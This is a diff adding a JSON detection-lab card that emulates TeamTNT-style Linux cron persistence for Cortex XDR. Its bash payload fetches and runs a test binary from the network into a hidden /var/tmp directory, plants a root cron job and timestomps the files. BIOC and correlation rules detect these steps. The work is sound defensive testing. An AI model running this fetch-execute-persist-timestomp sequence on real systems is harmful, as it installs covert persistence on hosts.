@@ -1,0 +1,396 @@
+{
+  "id": "TTP-2026-0198",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-11-11T05:45:00+00:00",
+    "updated_at": "2026-11-11T05:45:00+00:00",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-edr",
+      "linux",
+      "persistence",
+      "cron",
+      "wildfire-test-file",
+      "incident-grouping",
+      "long-dwell"
+    ],
+    "source_refs": [
+      "SRC-UNIT42",
+      "SRC-MITRE-ATTACK",
+      "SRC-PANW-TECHDOCS"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": true,
+      "platforms": [
+        "linux"
+      ],
+      "estimated_runtime_seconds": 2900,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Linux Cron Foothold — WildFire Test ELF Dropper Re-Executed on a Schedule",
+    "summary": "A root operator drops a binary into a hidden /var/tmp directory, runs it, plants a cron drop-in that re-runs it every five minutes, and timestomps the artefacts. Built so its Medium+ alerts group into one case: the agent's Local Analysis verdict seeds the case, and operator-installed Medium BIOCs and a correlation join it.",
+    "description": "Grounded in the 2026-11-11 lab read-back on pov-target-01: built-in Low Analytics BIOCs never formed a case, and the one HIGH Local Analysis Malware issue did (case 51877). The payload is Palo Alto Networks' official WildFire test ELF (benign). The cron foothold is a second causality chain rooted at cron; it joins the beacon chain's case through shared artifacts (host, payload SHA256), not a shared causality ID. Steps are spaced 40 s apart because back-to-back steps lost telemetry in this lab. The foothold deletes itself 45 minutes after install.",
+    "severity": "high",
+    "confidence": "medium"
+  },
+  "threat_context": {
+    "actors": [],
+    "campaigns": [
+      "TeamTNT Linux persistence tradecraft (cron, hidden /var/tmp payloads)"
+    ],
+    "malware_families": [],
+    "industries_targeted": [
+      "technology"
+    ]
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1053",
+        "subtechnique_id": "T1053.003",
+        "name": "Scheduled Task/Job: Cron",
+        "tactic_ids": [
+          "TA0003",
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Persistence",
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1036",
+        "subtechnique_id": "T1036.005",
+        "name": "Masquerading: Match Legitimate Resource Name or Location",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1564",
+        "subtechnique_id": "T1564.001",
+        "name": "Hide Artifacts: Hidden Files and Directories",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1070",
+        "subtechnique_id": "T1070.006",
+        "name": "Indicator Removal: Timestomp",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      }
+    ],
+    "kill_chain_phase": "installation",
+    "data_sources": [
+      "Process: Process Creation",
+      "File: File Creation",
+      "File: File Modification",
+      "Network Traffic: Network Connection Creation",
+      "Scheduled Job: Scheduled Job Creation"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "framework_reference_id": "SIM-EDR-023 — cron foothold with the WildFire test ELF, delivered by the CortexSim beacon as root.",
+    "privilege_required": "root",
+    "prerequisites": [
+      {
+        "description": "Cortex XDR agent on the Linux endpoint, policy in report mode for malware (lab: 9.4.0.470 on Ubuntu 24.04, policy SEBC-FY25-LAB-LinuxServerPolicy).",
+        "check_command": "test -x /opt/traps/bin/cytool && /opt/traps/bin/cytool runtime query | head -n 5"
+      },
+      {
+        "description": "Outbound HTTPS to wildfire.paloaltonetworks.com for the official test ELF.",
+        "check_command": "curl -fsSI https://wildfire.paloaltonetworks.com/publicapi/test/elf | head -n 1"
+      },
+      {
+        "description": "The three BIOCs and CR-EDR-0023 on this card are installed in the tenant at Medium before the run.",
+        "check_command": "echo 'confirm in the tenant console: Detection Rules > BIOC and Correlations'"
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# NOT A SUBSTITUTE FOR THE SCENARIO: scenarios/edr/edr-023-cron-foothold-wildfire-elf-grouped-case.yml is the delivery path (four steps, 40 s apart).\nD=/var/tmp/.cortexsim-ice; mkdir -p \"$D\"; chmod 700 \"$D\"\ncurl -fsSL https://wildfire.paloaltonetworks.com/publicapi/test/elf -o \"$D/kworker-ice\"; chmod 755 \"$D/kworker-ice\"\ntimeout 20 \"$D/kworker-ice\"\necho '*/5 * * * * root /bin/sh /var/tmp/.cortexsim-ice/ice-run.sh' > /etc/cron.d/cortexsim-ice\ntouch -r /etc/hostname /etc/cron.d/cortexsim-ice \"$D/kworker-ice\"",
+      "input_variables": [],
+      "timeout_seconds": 180
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "file",
+        "description": "The WildFire test ELF staged under a hidden /var/tmp directory (lab SHA256 4619b189d7dc3ae64ff36c14357e2c9527611e9f4dccef572aae64db09443343, 8608 bytes; Palo Alto may rotate it).",
+        "expected_value": "action_file_path = \"/var/tmp/.cortexsim-ice/kworker-ice\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "The ELF executed from the hidden directory, then the agent's Local Analysis Malware issue (HIGH, reported).",
+        "expected_value": "action_process_image_path = \"/var/tmp/.cortexsim-ice/kworker-ice\""
+      },
+      {
+        "artifact_type": "file",
+        "description": "A cron drop-in written by the step shell.",
+        "expected_value": "action_file_path = \"/etc/cron.d/cortexsim-ice\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "Every five minutes for 45 minutes: cron runs the hidden payload (actor_process_image_name = cron).",
+        "expected_value": "actor_process_image_name = \"cron\" and action_process_image_command_line contains \"/var/tmp/.cortexsim-ice/ice-run.sh\""
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "rm -f /etc/cron.d/cortexsim-ice\nrm -rf /var/tmp/.cortexsim-ice"
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "EDR-023 Cron Drop-In Written By Shell Outside Package Manager",
+        "description": "A shell or file utility (not dpkg/apt) creates or writes a file under /etc/cron.* or the cron spool. Package installs write these through the package manager; a shell writing one is an operator planting persistence. Operator-installed: create this as a BIOC rule in the tenant with EXACTLY this name (the matcher's strongest key is alert name == card name), severity Medium, from the XQL below. CortexSim never writes it to the tenant. Category: persistence.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE)\n| filter action_file_path ~= \"^/etc/cron[.](d|hourly|daily|weekly|monthly)/\" or action_file_path ~= \"^/var/spool/cron/\"\n| filter actor_process_image_name in (\"sh\", \"bash\", \"dash\", \"zsh\", \"tee\", \"cp\", \"mv\", \"cat\", \"python3\", \"perl\")",
+        "severity": "medium",
+        "mitre_technique_ids": [
+          "T1053.003"
+        ]
+      },
+      {
+        "name": "EDR-023 Cron Runs Payload From Hidden Var Tmp Directory",
+        "description": "cron itself spawns a command that runs something from a dot-directory under /var/tmp. Fires on every re-execution of the foothold, and only on cron's direct child, so it raises one issue per cron run. Operator-installed: create this as a BIOC rule in the tenant with EXACTLY this name (the matcher's strongest key is alert name == card name), severity Medium, from the XQL below. CortexSim never writes it to the tenant. Category: persistence.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = \"cron\"\n| filter action_process_image_command_line ~= \"/var/tmp/[.][^/ ]+/\"",
+        "severity": "medium",
+        "mitre_technique_ids": [
+          "T1053.003",
+          "T1564.001"
+        ]
+      },
+      {
+        "name": "EDR-023 Persistence Artifact Timestomped With Touch Reference",
+        "description": "touch with -r, -t or -d (or --reference / --date) rewrites the timestamps of a cron file, a systemd unit or a hidden /var/tmp artefact. Operator-installed: create this as a BIOC rule in the tenant with EXACTLY this name (the matcher's strongest key is alert name == card name), severity Medium, from the XQL below. CortexSim never writes it to the tenant. Category: evasion.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"touch\"\n| filter action_process_image_command_line ~= \"[ ]-(r|t|d)[ ]\" or action_process_image_command_line ~= \"--(reference|date)\"\n| filter action_process_image_command_line ~= \"(/etc/cron|/etc/systemd/system/|/var/tmp/[.])\"",
+        "severity": "medium",
+        "mitre_technique_ids": [
+          "T1070.006"
+        ]
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "EDR-023 WildFire Test ELF Retrieved Into Hidden Var Tmp Directory",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 3600\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"curl\" and action_process_image_command_line contains \"wildfire.paloaltonetworks.com/publicapi/test/elf\"\n| filter action_process_image_command_line ~= \"/var/tmp/[.][^/ ]+/\"\n| fields _time, agent_hostname, actor_causality_id, actor_process_image_name, action_process_image_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "EDR-023 Dropped ELF Executed From Hidden Var Tmp Directory",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 3600\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_path ~= \"^/var/tmp/[.][^/]+/\"\n| fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, action_process_image_path, action_process_image_sha256",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "hunt",
+        "name": "EDR-023 Cron Foothold Re-Executions Across A Reboot",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 86400\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = \"cron\" and action_process_image_command_line ~= \"/var/tmp/[.][^/ ]+/\"\n| comp count() as runs, min(_time) as first_run, max(_time) as last_run by agent_hostname, agent_id\n| fields agent_hostname, agent_id, runs, first_run, last_run",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "UNIX LOLBIN process connected to a rare external host",
+        "description": "PANW built-in XDR Analytics BIOC (Low; Low issues never create or join a case). Observed on pov-target-01 2026-11-11 as issue 1500447 on exactly this curl. The name is the built-in alert name verbatim so the matcher keys on it. The logic below is an approximation of the trigger for hunting, not the built-in's code.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_STREAM_CONNECT\n| filter actor_process_image_name in (\"curl\", \"wget\")\n| filter action_external_hostname != null",
+        "severity": "low",
+        "mitre_technique_ids": [
+          "T1071",
+          "T1105"
+        ],
+        "behavioral_profile": "statistical",
+        "causality_anchor": "The process making the connection (curl) and its causality chain; rarity of the destination across the tenant decides whether it fires."
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "EDR-023 Cron Foothold Planted Then Re-Executed On Schedule",
+        "rule_id": "CR-EDR-0023",
+        "logic": "Operator-installed correlation rule (CortexSim never writes it). Alert name EXACTLY as this rule's name; severity Medium; Scheduled, every 10 minutes, query time frame 1 hour; alert field mapping: agent_hostname -> Host Name, agent_id -> Agent ID (the mapped artifacts are what let a correlation issue join a case). Tested read-only in the lab tenant 2026-11-11 (status SUCCESS). XQL:\ndataset = xdr_data\n| filter agent_os_type = ENUM.AGENT_OS_LINUX\n| alter leg = if(event_type = ENUM.FILE and action_file_path ~= \"^/etc/cron[.]d/\" and actor_process_image_name in (\"sh\", \"bash\", \"dash\", \"zsh\", \"tee\", \"cp\", \"mv\", \"cat\", \"python3\", \"perl\"), \"planted\", if(event_type = ENUM.PROCESS and actor_process_image_name = \"cron\" and action_process_image_command_line ~= \"/var/tmp/[.][^/ ]+/\", \"reexecuted\", \"other\"))\n| filter leg in (\"planted\", \"reexecuted\")\n| comp count_distinct(leg) as legs, count() as events, min(_time) as first_seen, max(_time) as last_seen by agent_hostname, agent_id\n| filter legs >= 2"
+      }
+    ],
+    "prevention_modules": [
+      {
+        "name": "Local Analysis Malware",
+        "detection_id": "prevention-local-analysis-malware",
+        "module": "local_analysis",
+        "platforms": [
+          "linux"
+        ],
+        "alert_name_pattern": "Local Analysis Malware*",
+        "description": "The agent's Local Analysis verdict on executing the WildFire test ELF. Observed in this lab 2026-11-11: HIGH, action REPORTED under a report-mode policy, grouped as case 51877. Issues named Local Analysis are deduplicated over one hour, so do not run this within an hour of another execution of the same file on the host.",
+        "severity": "high",
+        "mitre_techniques": [
+          "T1204.002"
+        ]
+      }
+    ],
+    "analytics_modules": [
+      "Not declared: no built-in XDR Analytics (multi-event, baseline) alert has been observed on this endpoint, so none is an expectation."
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "malware-protection",
+        "coverage_tier": "prevention",
+        "rule_ids": [
+          "XDR-LOCAL-ANALYSIS"
+        ],
+        "license_required": "pro",
+        "evidence_query": "Issue 'Local Analysis Malware' on the endpoint for /var/tmp/.cortexsim-ice/kworker-ice (detection.method TRAPS)."
+      },
+      {
+        "module": "cortex-xdr",
+        "submodule": "bioc",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "EDR-023 Cron Drop-In Written By Shell Outside Package Manager",
+          "EDR-023 Cron Runs Payload From Hidden Var Tmp Directory",
+          "EDR-023 Persistence Artifact Timestomped With Touch Reference"
+        ],
+        "license_required": "pro",
+        "evidence_query": "Issues with these exact names on the endpoint, detection.method BIOC, severity Medium."
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "case-grouping",
+        "coverage_tier": "investigation",
+        "rule_ids": [
+          "XSIAM-CR-EDR-0023"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "Every Medium+ issue from the run (Local Analysis, the three BIOCs, CR-EDR-0023) carries one case_id."
+      }
+    ],
+    "threat_scenarios": [
+      {
+        "threat_scenario_id": "TS-EDR-023",
+        "name": "Cron Foothold Re-Executing a Dropped Binary, Grouped Into One Case",
+        "description": "Drop, run, persist via cron, re-run on a schedule, timestomp — and prove the Medium+ alerts from two causality chains land in one case.",
+        "threat_steps": [
+          {
+            "threat_step_id": "TS-EDR-023A",
+            "objective": "The dropped binary is detected on first execution and seeds a case.",
+            "preconditions": [
+              "Linux endpoint with the Cortex agent; malware profile in report mode."
+            ],
+            "steps": [
+              "Retrieve the WildFire test ELF into a hidden /var/tmp directory.",
+              "Execute it once."
+            ],
+            "success_criteria": [
+              "Issue `Local Analysis Malware` (HIGH) on the endpoint.",
+              "XQL `EDR-023 Dropped ELF Executed From Hidden Var Tmp Directory` returns the exec."
+            ],
+            "expected_score_weight": 0.5
+          },
+          {
+            "threat_step_id": "TS-EDR-023B",
+            "objective": "The cron foothold and its re-executions raise Medium issues that join the same case.",
+            "preconditions": [
+              "The three BIOCs and CR-EDR-0023 installed at Medium."
+            ],
+            "steps": [
+              "Plant the cron drop-in.",
+              "Wait for at least two cron runs.",
+              "Timestomp the artefacts."
+            ],
+            "success_criteria": [
+              "BIOC issues for the drop-in, each cron run and the timestomp.",
+              "CR-EDR-0023 fires.",
+              "All Medium+ issues share one case_id."
+            ],
+            "expected_score_weight": 0.5
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Run Linux servers' malware profile in block mode so a dropped binary is killed on first execution, not only reported.",
+      "Mount /tmp and /var/tmp noexec where the workload allows it.",
+      "Treat any write under /etc/cron.* outside configuration management as a change that needs an owner."
+    ],
+    "detection_engineering": [
+      "Key cron re-execution on actor_process_image_name = cron (cron's direct child), not on the causality actor, or every descendant raises its own issue.",
+      "Keep the BIOCs at Medium or higher: Low issues never create or join a case, so a Low persistence BIOC can never group.",
+      "Map agent_hostname and agent_id in the correlation rule's alert fields; correlation issues group only through mapped artifacts."
+    ]
+  },
+  "references": [
+    {
+      "title": "Unit 42 — TeamTNT Targets Exposed Docker APIs (cron, systemd, SSH-key and chattr persistence on Linux hosts)",
+      "url": "https://unit42.paloaltonetworks.com/teamtnt-cryptojacking-watchdog-operations/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK — T1053.003 Cron",
+      "url": "https://attack.mitre.org/techniques/T1053/003/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "Cortex XSIAM — Create a BIOC rule (XQL on xdr_data, filter and alter stages only)",
+      "url": "https://cortex-docs.paloaltonetworks.com/cortex-xsiam/detect-investigate-and-respond-to-threats/threat-management/detection-rules/what-are-detection-rules/whats-a-bioc/create-a-bioc-rule",
+      "publisher": "Palo Alto Networks TechDocs",
+      "publisher_id": "SRC-PANW-TECHDOCS"
+    },
+    {
+      "title": "Cortex XSIAM — Case grouping (Medium-or-higher issues group; shared artifacts and causality chain)",
+      "url": "https://cortex-docs.paloaltonetworks.com/cortex-xsiam/detect-investigate-and-respond-to-threats/investigation-and-response/case-concepts/case-grouping",
+      "publisher": "Palo Alto Networks TechDocs",
+      "publisher_id": "SRC-PANW-TECHDOCS"
+    }
+  ]
+}
